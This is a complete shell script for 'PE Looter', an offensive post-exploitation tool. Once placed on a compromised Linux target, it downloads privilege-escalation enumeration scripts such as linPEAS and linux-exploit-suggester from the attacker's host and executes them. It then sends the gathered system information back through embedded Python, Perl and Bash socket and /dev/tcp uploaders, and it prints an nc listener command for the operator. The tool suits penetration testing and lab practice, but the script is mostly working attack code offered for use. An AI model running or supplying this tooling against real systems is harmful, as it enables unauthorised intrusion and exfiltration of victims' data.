#!/bin/sh

#####################################################################
#
#   Tool: Privilege Escalation Looter
#   Author: Antoine Brunet (Lovebug)
#   Version: 1.0
#
#   PE Looter is a tool made to help you during the privilege
#   escalation phasis.
#   After uploaded in the target it will download and execute
#   all the scripts and binaries you configured and store their
#   output in a file.
#
#####################################################################

# --- Customisable configuration ---
OWN_IP="127.0.0.1"
DOWLOADED_PORT=80
UPLOADED_PORT=8100
TARGET_IP="10.1.1.2"      # TODO: remove
TARGET_UPLOAD_PORT=8090   # TODO: remove
OUTPUT="local_enumeration.txt"

DEBUG=0
VERIFY_INTEGRITY=0

# If FORCE_DOWNLOAD is set to 1 then the files will be downloaded even if
# the binary to run the script is not present on the target machine,
# the target machine architecture is not compliante with the bin arch
# the script has already been downloaded
FORCE_DOWNLOAD=1

# 1-url ; 2-noexec ;   3-arch  ; 4-execbin           ;   5-scriptargs   ; 6-integritycheck 
#  url  ; [noexec] ; [x64|x32] ; [python|perl|bash]  ; [arg1,arg2,arg3] ;    [MD5SUM]
#   *   ;          ;           ;          *          ;                  ;
#
# * : mandatory
#
# 1-url            : The url of the script to download
# 2-noexec         : If set this script will not be executed
# 3-arch           : The arch compliante to the binary
# 4-execbin        : The execution binary
# 5-scriptargs     : The args used to run the scripts <arg1,arg2,arg3,...>
# 6-integritycheck : The MD5Sum of the script in order to verify his integrity
FILES_TO_DOWNLOAD=$(cat <<-END
unix-privesc-check/upc.sh;;;sh;;ddcfe959895ad6a1e8c3e9c31cee0702
Bashark/bashark.sh;noexec;;;;dccf86ce980294721c0fffd9dd0c3850
pspy/pspy32;noexec;;;;b3b3d7ea8ccf37813c67ae0c58ab0cff
pspy/pspy64;noexec;;;;e04a36bb5444f2275990567614e1f509
linuxprivchecker/linuxprivchecker.py;;;python;;1919961f57f12d2f2929988440f1faf1
privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh;;;sh;;bf2f7f4cdda40e2c9409f43da4f677f3
linux-smart-enumeration/lse.sh;;;sh;;9c085090cdc827fc7425fc3e162b7a43
linux-exploit-suggester/linux-exploit-suggester.sh;;;bash;;dbd2d65f18ce8e17d999eca65df899c7
linux-exploit-suggester-2/linux-exploit-suggester-2.pl;;;perl;;56c5b3fa2d7a59d034a9096edc16d328
END
)

# --- Configuration ---
NAME="pelooter.sh"
CMD_TEST='command -v'
ARCH=''

OWN_URL="http://$OWN_IP:$DOWLOADED_PORT/"
TARGET_DOWNLOAD_PATH="/tmp/"

n='\\r\\n'
PY_DOWNLOADER_NAME="downloader.py"
PY_DOWNLOADER="import socket,sys,re\ntarget_host = \"$OWN_IP\"\ntarget_port = $DOWLOADED_PORT\nif len(sys.argv) != 3:\n\tprint(\"Usage: downloader.py <remote-file-to-download> <local-output-path>\")\n\tsys.exit(1)\nBUFF_SIZE = 4096\nfile_to_download = sys.argv[1]\noutput = sys.argv[2]\nheader = b''\ndata = b''\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((target_host,target_port))\nrequest = \"GET /%s HTTP/1.1$n""Host:%s$n$n\" % (file_to_download, target_host)\ns.send(request.encode())\nwhile True:\n\tpartHeader = s.recv(BUFF_SIZE)\n\theader += partHeader\n\tif b'$n$n' in header:\n\t\tbreak\nhttp_header = repr(header)\nn = re.search('HTTP\/1\.0 (?P<status_code>[0-9]{3})', http_header)\nif n:\n\tstatus_code = int(n.group(\"status_code\"))\n\tif status_code != 200:\n\t\ts.close()\n\t\tsys.exit(1)\nelse:\n\ts.close()\n\tsys.exit(1)\nm = re.search('Content-Length\: (?P<lenght>[0-9]+)', http_header)\nif m:\n\tfile_len = int(m.group(\"lenght\"))\n\twhile len(data) < file_len:\n\t\tpart = s.recv(BUFF_SIZE)\n\t\tdata += part\nelse:\n\ts.close()\n\tsys.exit(1)\ns.close()\nf=open(sys.argv[2], \"wb\")\nf.write(data)\nf.close()\nsys.exit(0)"
PL_DOWNLOADER_NAME="downloader.pl"
PL_DOWNLOADER="use Socket;\nuse warnings;\nuse strict;\nmy \$remote = '$OWN_IP';\nmy \$port = $DOWLOADED_PORT;\nif (\$#ARGV != 1) {\nprint \"Usage: downloader.py <remote-file-to-download> <local-output-path>\n\";\nexit(1);\n}\nmy \$buff_size = 4096;\nmy \$proto = getprotobyname('tcp');\nmy \$file_to_download = \$ARGV[0];\nmy \$output = \$ARGV[1];\nmy(\$sock);\nsocket(\$sock, AF_INET, SOCK_STREAM, \$proto) or exit(1);\nmy \$iaddr = inet_aton(\$remote) or exit(1);\nmy \$paddr = sockaddr_in(\$port, \$iaddr);\nconnect(\$sock , \$paddr) or exit(1);\nmy \$req = sprintf(\"GET /%s HTTP/1.1"$n"Host:%s$n$n\", \$file_to_download, \$remote);\nsend(\$sock, \$req, 0) or exit(1);\nmy \$content = \"\";\nmy \$content_length = 0;\nmy \$line_count = 0;\nmy \$is_content = 0;\nwhile (my \$line = <\$sock>)\n{\n\$line_count += 1;\nif (\$line_count > 7) {\n\$content .= \$line;\nnext;\n}\nif (\$line =~ m/HTTP\/1\.0 (?<status_code>[0-9]{3})/) {\nif ($+{status_code} != 200) {\nexit(1);\n}\nnext;\n}\nif (\$line =~ m/Content-Length\: (?<lenght>[0-9]+)/) {\n\$content_length = $+{lenght};\nnext;\n}\n}\nif (length(\$content) != \$content_length) {\nexit(1);\n}\nopen(FH, '>', \$output) or exit(1);\nprint FH \$content;\nclose(FH);\nclose(\$sock);\nexit(0);"
SH_DOWNLOADER_NAME="downloader.sh"
SH_DOWNLOADER="#!/bin/bash\nip=\"$OWN_IP\"\nport=$DOWLOADED_PORT\nfile_to_download=\$1\noutput=\$2\nif [ -z \"\$file_to_download\" ] && [ -z \"\$output\" ]\nthen\necho \"Usage: downloader.sh <remote-file-to-download> <local-output-path>\"\nexit 1\nfi\nexec 3<>/dev/tcp/\"\$ip\"/\"\$port\"\necho -e \"GET /\$file_to_download HTTP/1.1$n""Host: \$ip$n""Connection: close$n$n\" >&3\nfor i in `seq 1 7`;\ndo\nread -u 3 line\nif [[ \$line =~ ^HTTP/1\.0[[:blank:]]([0-9]{3}) ]]\nthen\nif [ \${BASH_REMATCH[1]} != \"200\" ]\nthen\nexit 1\nfi\nfi\ndone\nwhile [ 1 ]\ndo\nread -u 3 line\nif [ -z \"\$line\" ]\nthen\nbreak\nfi\necho \$line >> \$output\ndone\nexec 3<&-\nexit 0\n"

PY_UPLOADER_NAME="uploader.py"
PY_UPLOADER="import socket,sys,os\ntarget_host = \"$OWN_IP\"\ntarget_port = $UPLOADED_PORT\nif len(sys.argv) != 2 or os.path.isfile(sys.argv[1]) == False:\n\tprint(\"Usage: uploader.sh <local-file-to-upload>\")\n\tsys.exit(1)\nfile_to_upload = sys.argv[1]\ndata = b''\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((target_host,target_port))\nf=open(file_to_upload, \"rb\")\ndata = f.read()\ns.send(data.encode())\nf.close()\ns.close()\nsys.exit(0)"
PL_UPLOADER_NAME="uploader.pl"
PL_UPLOADER="use Socket;\nuse warnings;\nuse strict;\nmy \$remote = '$OWN_IP';\nmy \$port = $UPLOADED_PORT;\nmy \$file_to_upload = \$ARGV[0];\nif (!defined(\$file_to_upload) || ! -e \$file_to_upload) {\n    print \"Usage: uploader.sh <local-file-to-upload>\\n\";\n    exit(1);\n}\nmy \$proto = getprotobyname('tcp');\nmy(\$sock);\nsocket(\$sock, AF_INET, SOCK_STREAM, \$proto) or exit(1);\nmy \$iaddr = inet_aton(\$remote) or exit(1);\nmy \$paddr = sockaddr_in(\$port, \$iaddr);\nconnect(\$sock , \$paddr) or exit(1);\nopen(my \$fh, '<', \$file_to_upload) or exit(1);\nwhile(my \$row = <\$fh>){\n    send(\$sock, \$row, 0) or exit(1);\n}\nclose(\$fh);\nclose(\$sock);\nexit(0);"
SH_UPLOADER_NAME="uploader.sh"
SH_UPLOADER="#!/bin/bash\nip=\"$OWN_IP\"\nport=$UPLOADED_PORT\nfile_to_upload=\$1\nif [ -z \"\$file_to_upload\" ] || [ ! -f \$file_to_upload ]\nthen\n    echo \"Usage: uploader.sh <local-file-to-upload>\"\n    exit 1\nfi\nexec 4<>/dev/tcp/\"\$ip\"/\"\$port\"\ncat \$file_to_upload >&4\nexec 4<&-\nexit 0"

BANNER="#####################################################################\n#   LOCAL ENUMRATION ON THE MACHINE : $TARGET_IP\n#   This file is the result of the $NAME script\n#   Author: Antoine Brunet (Lovebug)\n#####################################################################\n"

splitter() {
    splitter_banner=$(cat <<-END
#####################################################################
%s[ Script: %s ]%s
#####################################################################\n
END
)
    splitter_char='='
    splitter_max_size=70
    splitter_empty_size=12
    splitter_chars=''

    script_name=$1
    name_size=$(echo -n $script_name | wc -c)
    rest_size=$(($splitter_max_size-12-$name_size))
    char_size=$(($rest_size / 2))

    for i in `seq $char_size`
    do
        splitter_chars=$splitter_chars$splitter_char
    done

    printf "$splitter_banner" $splitter_chars $script_name $splitter_chars >> $OUTPUT
}

# --- Colors ---

# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White

# Bold
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White
NC='\033[0m'              # Text Reset

# ------ Logs ------
log_debug() {
    msg=$1
    if [ $DEBUG -eq 1 ]
    then
        echo "${Cyan}[DBG] - ${msg}${NC}" >&2
    fi
}

log_info() {
    msg=$1
    echo "${BBlue}[INF] - ${msg}${NC}" >&2
}

log_warning() {
    msg=$1
    echo "${BYellow}[WAR] - ${msg}${NC}" >&2
}

log_error() {
    msg=$1
    echo "${BRed}[ERR] - ${msg}${NC}" >&2
}

# ------ Functions ------
update_local_bin_arch() {
    test_cmd=$($CMD_TEST 'command' 2>/dev/null)
    if [ $? -eq 0 ]
    then
        if [ "$test_cmd" != "command" ]
        then
            test_cmd=$(which which 2>/dev/null)
            if [ -z "$test_cmd" ]
            then
                log_error "None of the commands \`command\` and \`which\` seems to be present on this machine"
                exit 1
            else
                CMD_TEST='which'
            fi
        fi
    else
        test_cmd=$(which which 2>/dev/null)
        if [ -z "$test_cmd" ]
        then
            log_error "None of the commands \`command\` and \`which\` seems to be present on this machine"
            exit 1
        else
            CMD_TEST='which'
        fi
    fi

    test_arch=$($CMD_TEST arch 2>/dev/null)
    if [ -z "$test_arch" ]
    then
        log_warning "The \`arch\` cmd is not available"
    else
        tmp_arch=$($test_arch)
        if [ "$tmp_arch" = "x86_64" ]
        then
            log_debug "Arch 64 bits"
            ARCH="x64"
        else
            log_debug "Arch 32 bits"
            ARCH="x32"
        fi
    fi
}

get_absolute_bin_path() {
    bin=$1

    if [ -z "$bin" ]
    then
        log_error "The bin variable must be set"
        return
    fi

    test_bin=$($CMD_TEST $bin 2>/dev/null)
    if [ -z "$test_bin" ]
    then
        log_warning "Unable to find the absolute path of \`$bin\`"
    else
        echo $test_bin
    fi
}

_get_option() {
    line=$1
    opt="${2:-1}"
    if [ -z "$line" ]
    then
        log_error "The line variable cannot be empty"
        exit 2
    fi

    echo $line | cut -d ';' -f $opt
}

opt_get_url() {
    line=$1
    _get_option "$line" 1
}

opt_get_noexec() {
    line=$1
    _get_option "$line" 2
}

opt_get_arch() {
    line=$1
    _get_option "$line" 3
}

opt_get_execbin() {
    line=$1
    _get_option "$line" 4
}

opt_get_scriptargs() {
    line=$1
    args=$(_get_option "$line" 5)
    echo $args | tr "," " "
}

opt_get_integrity() {
    line=$1
    _get_option "$line" 6
}

# --- Main functions ---
download_scripts() {
    # wget
    cmd_bin=$($CMD_TEST wget 2>/dev/null)
    if [ $? -eq 0 ]
    then
        log_debug "Wget will be used to download scripts"
        for file in $FILES_TO_DOWNLOAD
        do
            script_local_path=$(opt_get_url $file)
            url=$OWN_URL$script_local_path
            script_name=${script_local_path##*\/}
            script_path=$TARGET_DOWNLOAD_PATH$script_name

            if [ $FORCE_DOWNLOAD -eq 0 ]
            then
                bin_name=$(opt_get_execbin $file)
                bin=$(get_absolute_bin_path $bin_name)
                log_debug "Bin absolute path: $bin"

                if [ -f $script_path ]
                then
                    log_info "The script \`$script_name\` already exist \`$script_path\` it will not be downloaded again"
                    continue
                fi

                if [ -z "$bin" ]
                then
                    log_warning "The script \`$script_name\` will not be download because the binary \`$bin_name\` has not been found on the machine"
                    continue
                fi

                bin_arch=$(opt_get_arch $file)
                if [ ! -z "$bin_arch" ]
                then
                    if [ "$bin_arch" != $ARCH ]
                    then
                        log_warning "The script \`$script_name\` will not be download because the current archi \`$ARCH\` is not compatible with the one set \`$bin_arch\`"
                        continue
                    fi
                fi
            else
                if [ -f $script_path ]
                then
                    rm -f $script_path 2> /dev/null
                    log_debug "The \`$script_path\` has been deleted before to download it again"
                fi
            fi

            log_debug "Download the url: $url"
            $cmd_bin $url -O $script_path 2> /dev/null
            if [ $? -eq 0 ]
            then
                log_info "The script $script_name have been downloaded and save in this path: $script_path"
            else
                log_error "Unable to download the script $script_name"
                rm -f $script_path
            fi
        done
        return
    fi

    # curl
    cmd_bin=$($CMD_TEST curl 2>/dev/null)
    if [ $? -eq 0 ]
    then
        log_debug "Curl will be used to download scripts"
        for file in $FILES_TO_DOWNLOAD
        do
            script_local_path=$(opt_get_url $file)
            url=$OWN_URL$script_local_path
            script_name=${script_local_path##*\/}
            script_path=$TARGET_DOWNLOAD_PATH$script_name

            if [ $FORCE_DOWNLOAD -eq 0 ]
            then
                bin_name=$(opt_get_execbin $file)
                bin=$(get_absolute_bin_path $bin_name)
                log_debug "Bin absolute path: $bin"

                if [ -f $script_path ]
                then
                    log_info "The script \`$script_name\` already exist \`$script_path\` it will not be downloaded again"
                    continue
                fi

                if [ -z "$bin" ]
                then
                    log_warning "The script \`$script_name\` will not be download because the binary \`$bin_name\` has not been found on the machine"
                    continue
                fi

                bin_arch=$(opt_get_arch $file)
                if [ ! -z "$bin_arch" ]
                then
                    if [ "$bin_arch" != $ARCH ]
                    then
                        log_warning "The script \`$script_name\` will not be download because the current archi \`$ARCH\` is not compatible with the one set \`$bin_arch\`"
                        continue
                    fi
                fi
            else
                if [ -f $script_path ]
                then
                    rm -f $script_path 2> /dev/null
                    log_debug "The \`$script_path\` has been deleted before to download it again"
                fi
            fi

            log_debug "Download the url: $url"
            $cmd_bin -i $url -o $script_path 2> /dev/null
            if [ -f $script_path ]
            then
                status_code=$(head -n1 $script_path | awk '{print $2}')
                if [ $status_code -eq 200 ]
                then
                    script_path_tmp="$script_path.tmp"
                    log_info "The script $script_name have been downloaded and save in this path: $script_path"
                    sed '1,7d' $script_path > $script_path_tmp; mv $script_path_tmp $script_path
                    log_debug "The 7 first line of the file downloaded ($script_path) have been deleted"
                    rm -f $script_path_tmp
                else
                    log_error "Unable to download the script $script_name"
                    rm -f $script_path
                fi
            else
                log_error "Unable to download the script $script_name"
                rm -f $script_path
            fi
        done
        return
    fi

    # Python
    cmd_bin=$($CMD_TEST python 2>/dev/null)
    if [ $? -eq 0 ]
    then
        echo $PY_DOWNLOADER > $TARGET_DOWNLOAD_PATH$PY_DOWNLOADER_NAME
        log_info "A Python script has been created: $TARGET_DOWNLOAD_PATH$PY_DOWNLOADER_NAME"
        log_debug "The python script \`$TARGET_DOWNLOAD_PATH$PY_DOWNLOADER_NAME\` will be used to download the scripts"
        for file in $FILES_TO_DOWNLOAD
        do
            script_local_path=$(opt_get_url $file)
            script_name=${script_local_path##*\/}
            script_path=$TARGET_DOWNLOAD_PATH$script_name

            if [ $FORCE_DOWNLOAD -eq 0 ]
            then
                bin_name=$(opt_get_execbin $file)
                bin=$(get_absolute_bin_path $bin_name)
                log_debug "Bin absolute path: $bin"

                if [ -f $script_path ]
                then
                    log_info "The script \`$script_name\` already exist \`$script_path\` it will not be downloaded again"
                    continue
                fi

                if [ -z "$bin" ]
                then
                    log_warning "The script \`$script_name\` will not be download because the binary \`$bin_name\` has not been found on the machine"
                    continue
                fi

                bin_arch=$(opt_get_arch $file)
                if [ ! -z "$bin_arch" ]
                then
                    if [ "$bin_arch" != $ARCH ]
                    then
                        log_warning "The script \`$script_name\` will not be download because the current archi \`$ARCH\` is not compatible with the one set \`$bin_arch\`"
                        continue
                    fi
                fi
            else
                if [ -f $script_path ]
                then
                    rm -f $script_path 2> /dev/null
                    log_debug "The \`$script_path\` has been deleted before to download it again"
                fi
            fi

            $cmd_bin $TARGET_DOWNLOAD_PATH$PY_DOWNLOADER_NAME $script_local_path $script_path
            if [ $? -eq 0 ]
            then
                log_info "The script $script_name has been downloaded and save in this path: $script_path"
            else
                log_error "Unable to download the script $script_name"
            fi
        done
        return
    fi

    # Perl
    cmd_bin=$($CMD_TEST perl 2>/dev/null)
    if [ $? -eq 0 ]
    then
        echo $PL_DOWNLOADER > $TARGET_DOWNLOAD_PATH$PL_DOWNLOADER_NAME
        log_info "A Perl script has been created: $TARGET_DOWNLOAD_PATH$PL_DOWNLOADER_NAME"
        log_debug "The perl script \`$TARGET_DOWNLOAD_PATH$PL_DOWNLOADER_NAME\` will be used to download the scripts"
        for file in $FILES_TO_DOWNLOAD
        do
            script_local_path=$(opt_get_url $file)
            script_name=${script_local_path##*\/}
            script_path=$TARGET_DOWNLOAD_PATH$script_name

            if [ $FORCE_DOWNLOAD -eq 0 ]
            then
                bin_name=$(opt_get_execbin $file)
                bin=$(get_absolute_bin_path $bin_name)
                log_debug "Bin absolute path: $bin"

                if [ -f $script_path ]
                then
                    log_info "The script \`$script_name\` already exist \`$script_path\` it will not be downloaded again"
                    continue
                fi

                if [ -z "$bin" ]
                then
                    log_warning "The script \`$script_name\` will not be download because the binary \`$bin_name\` has not been found on the machine"
                    continue
                fi

                bin_arch=$(opt_get_arch $file)
                if [ ! -z "$bin_arch" ]
                then
                    if [ "$bin_arch" != $ARCH ]
                    then
                        log_warning "The script \`$script_name\` will not be download because the current archi \`$ARCH\` is not compatible with the one set \`$bin_arch\`"
                        continue
                    fi
                fi
            else
                if [ -f $script_path ]
                then
                    rm -f $script_path 2> /dev/null
                    log_debug "The \`$script_path\` has been deleted before to download it again"
                fi
            fi

            $cmd_bin $TARGET_DOWNLOAD_PATH$PL_DOWNLOADER_NAME $script_local_path $script_path
            if [ $? -eq 0 ]
            then
                log_info "The script $script_name have been downloaded and save in this path: $script_path"
            else
                log_error "Unable to download the script $script_name"
            fi
        done
        return
    fi

    # Bash
    cmd_bin=$($CMD_TEST bash 2>/dev/null)
    if [ $? -eq 0 ]
    then
        echo $SH_DOWNLOADER > $TARGET_DOWNLOAD_PATH$SH_DOWNLOADER_NAME
        log_info "A Bash script has been created: $TARGET_DOWNLOAD_PATH$SH_DOWNLOADER_NAME"
        log_debug "The Bash script \`$TARGET_DOWNLOAD_PATH$SH_DOWNLOADER_NAME\` will be used to download the scripts"
        for file in $FILES_TO_DOWNLOAD
        do
            script_local_path=$(opt_get_url $file)
            script_name=${script_local_path##*\/}
            script_path=$TARGET_DOWNLOAD_PATH$script_name

            if [ $FORCE_DOWNLOAD -eq 0 ]
            then
                bin_name=$(opt_get_execbin $file)
                bin=$(get_absolute_bin_path $bin_name)
                log_debug "Bin absolute path: $bin"

                if [ -f $script_path ]
                then
                    log_info "The script \`$script_name\` already exist \`$script_path\` it will not be downloaded again"
                    continue
                fi

                if [ -z "$bin" ]
                then
                    log_warning "The script \`$script_name\` will not be download because the binary \`$bin_name\` has not been found on the machine"
                    continue
                fi

                bin_arch=$(opt_get_arch $file)
                if [ ! -z "$bin_arch" ]
                then
                    if [ "$bin_arch" != $ARCH ]
                    then
                        log_warning "The script \`$script_name\` will not be download because the current archi \`$ARCH\` is not compatible with the one set \`$bin_arch\`"
                        continue
                    fi
                fi
            else
                if [ -f $script_path ]
                then
                    rm -f $script_path 2> /dev/null
                    log_debug "The \`$script_path\` has been deleted before to download it again"
                fi
            fi

            $cmd_bin $TARGET_DOWNLOAD_PATH$SH_DOWNLOADER_NAME $script_local_path $script_path
            if [ $? -eq 0 ]
            then
                log_info "The script $script_name have been downloaded and save in this path: $script_path"
            else
                log_error "Unable to download the script $script_name"
            fi
        done
        return
    fi

    log_error "Unable to find an available binary to download the scripts"
    exit 1
}

integrity_checks() {
    integrity="false"
    for file in $FILES_TO_DOWNLOAD
    do
        script_local_path=$(opt_get_url $file)
        script_integrity=$(opt_get_integrity $file)
        script_name=${script_local_path##*\/}
        script_path=$TARGET_DOWNLOAD_PATH$script_name
        
        if [ -z "$script_integrity" ]
        then
            log_warning "No integrity md5 for the script $script_path"
            continue
        fi

        md5_cmd=$($CMD_TEST md5sum 2>/dev/null)
        if [ -z "$md5_cmd" ]
        then
            log_warning "Unable to test the integrity the md5sum command has not been found on this machine"
            integrity="true"
            break
        fi

        md5=$($md5_cmd $script_path | awk '{print $1}')
        if [ "$md5" != "$script_integrity" ]
        then
            log_error "The integrity of the script \`$script_path\` has been violated"
            exit 1
        fi
        integrity="true"
    done
    echo "$integrity"
}

execute_scripts() {
    echo $BANNER > $OUTPUT
    for file in $FILES_TO_DOWNLOAD
    do
        noexec=$(opt_get_noexec $file)
        script_local_path=$(opt_get_url $file)
        script_bin=$(opt_get_execbin $file)
        script_args=$(opt_get_scriptargs $file)
        script_name=${script_local_path##*\/}
        file_to_exec=$TARGET_DOWNLOAD_PATH$script_name

        if [ "$noexec" = "noexec" ]
        then
            log_info "noexec flag found for the script \`$script_name\`, it will not be executed"
            continue
        fi

        if [ ! -f $file_to_exec ]
        then
            log_error "The file \`$file_to_exec\` does not exist"
            continue
        fi
        
        bin=$(get_absolute_bin_path $script_bin)
        log_info "Execution of the script \`$file_to_exec\`"
        splitter $script_name

        if [ -z "$bin" ]
        then
            log_warning "The bin absolute path is empty. The script will be run with the following cmd: $script_bin $file_to_exec $script_args".
            $script_bin $file_to_exec $script_args 2> /dev/null >> $OUTPUT
            if [ $? -eq 127 ]
            then
                log_error "Unable to run the script $file_to_exec, the binary (\`$script_bin\`) used to run does not exist in this machine"
                continue
            fi
        else
            log_debug "Exec cmd: $bin $file_to_exec $script_args 2> /dev/null >> $OUTPUT"
            $bin $file_to_exec $script_args 2> /dev/null >> $OUTPUT
        fi
        log_info "The script $file_to_exec has been run ${BGreen}successfully"
    done
}

upload_results() {
    # Python
    cmd_bin=$($CMD_TEST python 2>/dev/null)
    if [ $? -eq 0 ]
    then
        echo $PY_UPLOADER > $TARGET_DOWNLOAD_PATH$PY_UPLOADER_NAME
        log_info "A Python script has been created: $TARGET_DOWNLOAD_PATH$PY_UPLOADER_NAME"
        log_debug "The python script \`$TARGET_DOWNLOAD_PATH$PY_UPLOADER_NAME\` will be used to upload the scripts results"
        $cmd_bin $TARGET_DOWNLOAD_PATH$PY_UPLOADER_NAME $OUTPUT
        return
    fi

    # Perl
    cmd_bin=$($CMD_TEST perl 2>/dev/null)
    if [ $? -eq 0 ]
    then
        echo $PL_UPLOADER > $TARGET_DOWNLOAD_PATH$PL_UPLOADER_NAME
        log_info "A Perl script has been created: $TARGET_DOWNLOAD_PATH$PL_UPLOADER_NAME"
        log_debug "The perl script \`$TARGET_DOWNLOAD_PATH$PL_UPLOADER_NAME\` will be used to upload the scripts results"
        $cmd_bin $TARGET_DOWNLOAD_PATH$PL_UPLOADER_NAME $OUTPUT
        return
    fi

    # Bash
    cmd_bin=$($CMD_TEST bash 2>/dev/null)
    if [ $? -eq 0 ]
    then
        echo $SH_UPLOADER > $TARGET_DOWNLOAD_PATH$SH_UPLOADER_NAME
        log_info "A Bash script has been created: $TARGET_DOWNLOAD_PATH$SH_UPLOADER_NAME"
        log_debug "The Bash script \`$TARGET_DOWNLOAD_PATH$SH_UPLOADER_NAME\` will be used to upload the scripts results"
        $cmd_bin $TARGET_DOWNLOAD_PATH$SH_UPLOADER_NAME $OUTPUT
        return
    fi
}

# ------------------ Main ------------------

# Update the test cmd command and the local archi
update_local_bin_arch

# Download all the scripts
log_info "---- Download remote files ----"
download_scripts

# Integrity checks
if [ $VERIFY_INTEGRITY -eq 1 ]
then
    log_info "---- Integrity checks ----"
    integrity=$(integrity_checks)
    if [ "$integrity" = "false" ]
    then
        exit 1
    fi
    log_info "The integrity of all scripts have been verifyed"
fi

# Execute scripts
log_info "---- Execute downloaded scripts ----"
execute_scripts

# Open a web server to download the results file
log_info "---- Upload results ----"
log_info "Run this command on your machine to get back the results of the scripts: ${BPurple}nc -lvnp $UPLOADED_PORT > $OUTPUT"
echo "${BPurple}Press Enter to continue...${NC}"
read INPUT_STRING
upload_results